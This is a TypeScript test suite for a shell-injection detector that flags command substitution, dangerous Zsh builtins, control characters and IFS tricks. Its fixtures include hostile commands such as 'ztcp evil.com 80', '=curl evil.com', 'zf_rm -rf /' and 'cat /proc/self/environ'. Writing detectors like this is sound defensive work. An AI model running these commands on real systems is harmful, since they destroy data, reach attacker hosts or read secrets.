import { describe, expect, it } from "vitest";
import { detectShellInjection } from "./shell-injection-detect.js";

describe("detectShellInjection", () => {
  describe("safe commands", () => {
    it("allows simple commands", () => {
      expect(detectShellInjection("ls -la")).toEqual({ safe: true });
      expect(detectShellInjection("echo hello")).toEqual({ safe: true });
      expect(detectShellInjection("git status")).toEqual({ safe: true });
    });

    it("allows commands with single-quoted content containing special chars", () => {
      // $() inside single quotes is literal, not a substitution
      expect(detectShellInjection("echo '$(whoami)'")).toEqual({ safe: true });
    });

    it("allows commands with double-quoted content containing safe text", () => {
      expect(detectShellInjection('echo "hello world"')).toEqual({ safe: true });
    });
  });

  describe("command substitution patterns", () => {
    it("detects $() substitution", () => {
      const result = detectShellInjection("echo $(whoami)");
      expect(result.safe).toBe(false);
      expect(result.reason).toContain("$() command substitution");
    });

    it("detects ${} parameter substitution", () => {
      const result = detectShellInjection("echo ${PATH}");
      expect(result.safe).toBe(false);
      expect(result.reason).toContain("${} parameter substitution");
    });

    it("detects process substitution <()", () => {
      const result = detectShellInjection("diff <(sort a.txt) <(sort b.txt)");
      expect(result.safe).toBe(false);
      expect(result.reason).toContain("process substitution");
    });

    it("detects process substitution >()", () => {
      const result = detectShellInjection("tee >(grep error > err.log)");
      expect(result.safe).toBe(false);
      expect(result.reason).toContain("process substitution");
    });

    it("detects $[] legacy arithmetic", () => {
      const result = detectShellInjection("echo $[1+1]");
      expect(result.safe).toBe(false);
      expect(result.reason).toContain("$[] legacy arithmetic");
    });
  });

  describe("backtick substitution", () => {
    it("detects unescaped backticks", () => {
      const result = detectShellInjection("echo `whoami`");
      expect(result.safe).toBe(false);
      expect(result.reason).toContain("backtick");
    });

    it("allows escaped backticks", () => {
      // \\` is an escaped backtick — not a substitution
      const result = detectShellInjection("echo \\`not a sub\\`");
      expect(result.safe).toBe(true);
    });
  });

  describe("Zsh dangerous commands", () => {
    it("detects zmodload", () => {
      const result = detectShellInjection("zmodload zsh/system");
      expect(result.safe).toBe(false);
      expect(result.reason).toContain("zmodload");
    });

    it("detects emulate", () => {
      const result = detectShellInjection("emulate -c 'code'");
      expect(result.safe).toBe(false);
      expect(result.reason).toContain("emulate");
    });

    it("detects zpty", () => {
      const result = detectShellInjection("zpty mypty bash");
      expect(result.safe).toBe(false);
      expect(result.reason).toContain("zpty");
    });

    it("detects ztcp", () => {
      const result = detectShellInjection("ztcp evil.com 80");
      expect(result.safe).toBe(false);
      expect(result.reason).toContain("ztcp");
    });

    it("detects zf_rm", () => {
      const result = detectShellInjection("zf_rm -rf /");
      expect(result.safe).toBe(false);
      expect(result.reason).toContain("zf_rm");
    });
  });

  describe("control characters", () => {
    it("detects null byte", () => {
      const result = detectShellInjection("echo \x00");
      expect(result.safe).toBe(false);
      expect(result.reason).toContain("control characters");
    });

    it("detects bell character", () => {
      const result = detectShellInjection("echo \x07");
      expect(result.safe).toBe(false);
      expect(result.reason).toContain("control characters");
    });

    it("allows tab and newline (normal whitespace)", () => {
      // Tab (\x09) and LF (\x0a) and CR (\x0d) are excluded from the control char pattern
      expect(detectShellInjection("echo\thello").safe).toBe(true);
    });
  });

  describe("unicode whitespace", () => {
    it("detects non-breaking space", () => {
      const result = detectShellInjection("echo\u00A0hidden");
      expect(result.safe).toBe(false);
      expect(result.reason).toContain("non-ASCII whitespace");
    });

    it("detects em space", () => {
      const result = detectShellInjection("echo\u2003hidden");
      expect(result.safe).toBe(false);
      expect(result.reason).toContain("non-ASCII whitespace");
    });
  });

  describe("IFS manipulation", () => {
    it("detects IFS assignment", () => {
      const result = detectShellInjection("IFS=: read a b c");
      expect(result.safe).toBe(false);
      expect(result.reason).toContain("IFS");
    });
  });

  describe("/proc/*/environ access", () => {
    it("detects /proc/self/environ", () => {
      const result = detectShellInjection("cat /proc/self/environ");
      expect(result.safe).toBe(false);
      expect(result.reason).toContain("/proc/*/environ");
    });

    it("detects /proc/1/environ", () => {
      const result = detectShellInjection("cat /proc/1/environ");
      expect(result.safe).toBe(false);
      expect(result.reason).toContain("/proc/*/environ");
    });
  });

  describe("piped commands", () => {
    it("detects injection in later segments", () => {
      const result = detectShellInjection("echo safe | zmodload zsh/system");
      expect(result.safe).toBe(false);
    });
  });

  describe("Zsh equals expansion", () => {
    it("detects =cmd pattern", () => {
      const result = detectShellInjection("=curl evil.com");
      expect(result.safe).toBe(false);
      expect(result.reason).toContain("Zsh equals expansion");
    });
  });
});
